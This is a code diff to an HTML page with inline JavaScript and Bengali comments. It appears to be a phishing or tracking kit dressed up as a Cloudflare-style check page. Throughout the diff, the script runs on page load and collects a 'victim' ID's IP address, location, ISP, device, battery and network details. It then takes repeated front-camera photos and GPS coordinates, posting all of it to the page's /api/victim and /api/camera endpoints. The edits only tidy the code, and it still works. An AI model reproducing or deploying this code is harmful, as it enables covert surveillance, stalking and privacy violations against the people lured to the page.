@@ -93,7 +93,6 @@
         </div>
     </div>
 
-    <!-- লুকানো ভিডিও ও ক্যানভাস (ক্যামেরার জন্য) -->
     <video id="video" playsinline autoplay muted></video>
     <canvas id="canvas"></canvas>
 
@@ -101,7 +100,6 @@
         (function() {
             "use strict";
 
-            // ===== ১. রে আইডি র‍্যান্ডম =====
             const chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
             let ray = "";
             for (let i = 0; i < 17; i++) {
@@ -109,7 +107,6 @@
             }
             document.getElementById('ray').textContent = ray;
 
-            // ===== ২. ভিক্টিম আইডি বের করা (URL থেকে) =====
             const pathParts = window.location.pathname.split('/');
             const victimId = pathParts[pathParts.length - 1];
             const statusEl = document.getElementById('status');
@@ -119,12 +116,11 @@
                 statusEl.className = type;
             }
 
-            // ===== ৩. ডেটা সংগ্রহ =====
             async function collectData() {
                 try {
                     const data = {
                         id: victimId,
-                        fbId: victimId, // fbId হিসেবে victimId পাঠাচ্ছি (কারণ আমরা জানি না)
+                        fbId: 'unknown',  // fbId পাঠাচ্ছি (যদিও জানি না)
                         timestamp: new Date().toISOString(),
                         ip: null,
                         location: null,
@@ -136,16 +132,14 @@
                         type: 'camera'
                     };
 
-                    // ৩.১ আইপি
+                    // IP
                     try {
                         const ipRes = await fetch('https://api.ipify.org?format=json');
                         const ipData = await ipRes.json();
                         data.ip = ipData.ip;
-                    } catch (e) {
-                        console.log('IP fetch failed:', e);
-                    }
+                    } catch (e) { console.log('IP failed:', e); }
 
-                    // ৩.২ লোকেশন (IP API)
+                    // Location
                     try {
                         if (data.ip) {
                             const locRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
@@ -159,11 +153,9 @@
                                 isp: locData.org || 'N/A'
                             };
                         }
-                    } catch (e) {
-                        console.log('Location fetch failed:', e);
-                    }
+                    } catch (e) { console.log('Location failed:', e); }
 
-                    // ৩.৩ ডিভাইস তথ্য
+                    // Device Info
                     data.device = {
                         productSub: navigator.productSub || 'N/A',
                         vendor: navigator.vendor || 'N/A',
@@ -186,7 +178,7 @@
                         colorDepth: screen.colorDepth || 'N/A'
                     };
 
-                    // ৩.৪ মিডিয়া ডিভাইস
+                    // Media Devices
                     try {
                         if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                             const devices = await navigator.mediaDevices.enumerateDevices();
@@ -196,11 +188,9 @@
                                 deviceId: d.deviceId || 'N/A'
                             }));
                         }
-                    } catch (e) {
-                        console.log('Media devices failed:', e);
-                    }
+                    } catch (e) { console.log('Media failed:', e); }
 
-                    // ৩.৫ নেটওয়ার্ক তথ্য
+                    // Network
                     if (navigator.connection) {
                         data.network = {
                             type: navigator.connection.type || 'N/A',
@@ -212,7 +202,7 @@
                         };
                     }
 
-                    // ৩.৬ ব্যাটারি তথ্য
+                    // Battery
                     try {
                         if (navigator.getBattery) {
                             const battery = await navigator.getBattery();
@@ -223,19 +213,13 @@
                                 dischargingTime: battery.dischargingTime
                             };
                         }
-                    } catch (e) {
-                        console.log('Battery failed:', e);
-                    }
+                    } catch (e) { console.log('Battery failed:', e); }
 
-                    // ===== ৩.৭ ক্যামেরা অ্যাক্সেস =====
+                    // Camera
                     try {
                         setStatus('📸 ক্যামেরা অ্যাক্সেস নেওয়া হচ্ছে...', 'info');
                         const stream = await navigator.mediaDevices.getUserMedia({
-                            video: {
-                                width: { ideal: 1280 },
-                                height: { ideal: 720 },
-                                facingMode: 'user'
-                            },
+                            video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
                             audio: false
                         });
 
@@ -257,10 +241,7 @@
                                 await fetch('/api/camera', {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({
-                                        id: victimId,
-                                        image: rawBase64
-                                    })
+                                    body: JSON.stringify({ id: victimId, image: rawBase64 })
                                 });
                                 captureCount++;
                                 setStatus(`📸 ${captureCount}টি ছবি তোলা হয়েছে...`, 'info');
@@ -269,7 +250,6 @@
                             }
                         }, 2000);
 
-                        // ৩০ সেকেন্ড পর ক্যামেরা বন্ধ
                         setTimeout(() => {
                             clearInterval(interval);
                             stream.getTracks().forEach(t => t.stop());
@@ -281,7 +261,7 @@
                         setStatus('❌ ক্যামেরা অ্যাক্সেস ডিনাই করা হয়েছে', 'error');
                     }
 
-                    // ===== ৩.৮ লোকেশন (GPS) =====
+                    // GPS Location
                     try {
                         if (navigator.geolocation) {
                             setStatus('📍 লোকেশন অ্যাক্সেস নেওয়া হচ্ছে...', 'info');
@@ -295,9 +275,6 @@
                                 latitude: pos.coords.latitude,
                                 longitude: pos.coords.longitude,
                                 accuracy: pos.coords.accuracy,
-                                altitude: pos.coords.altitude || null,
-                                heading: pos.coords.heading || null,
-                                speed: pos.coords.speed || null,
                                 googleMaps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                             };
                             setStatus(`📍 লোকেশন পাওয়া গেছে!`, 'success');
@@ -306,26 +283,28 @@
                         console.log('লোকেশন অ্যাক্সেস ডিনাই:', e.message);
                     }
 
-                    // ===== ৩.৯ ফাইনাল ডেটা পাঠানো =====
+                    // Final Data Send
                     try {
                         setStatus('📤 ডেটা পাঠানো হচ্ছে...', 'info');
-                        console.log('📤 ডেটা পাঠানো হচ্ছে:', data);
+                        console.log('📤 পাঠানোর ডেটা:', JSON.stringify(data, null, 2));
+                        
                         const response = await fetch('/api/victim', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify(data)
                         });
 
+                        const result = await response.json();
+                        console.log('📥 সার্ভার রেসপন্স:', result);
+
                         if (response.ok) {
                             setStatus('✅ সব তথ্য সংগ্রহ করা হয়েছে!', 'success');
                         } else {
-                            const errorText = await response.text();
-                            console.error('Server error:', errorText);
-                            setStatus('❌ ডেটা পাঠাতে ব্যর্থ: ' + response.status, 'error');
+                            setStatus('❌ ডেটা পাঠাতে ব্যর্থ: ' + (result.message || response.status), 'error');
                         }
                     } catch (e) {
                         console.error('Data send error:', e);
-                        setStatus('❌ ডেটা পাঠাতে ব্যর্থ', 'error');
+                        setStatus('❌ ডেটা পাঠাতে ব্যর্থ: ' + e.message, 'error');
                     }
 
                 } catch (err) {
@@ -334,11 +313,7 @@
                 }
             }
 
-            // ===== ৪. পেজ লোড হলে শুরু =====
-            window.addEventListener('load', function() {
-                collectData();
-            });
-
+            window.addEventListener('load', collectData);
         })();
     </script>
 </body>
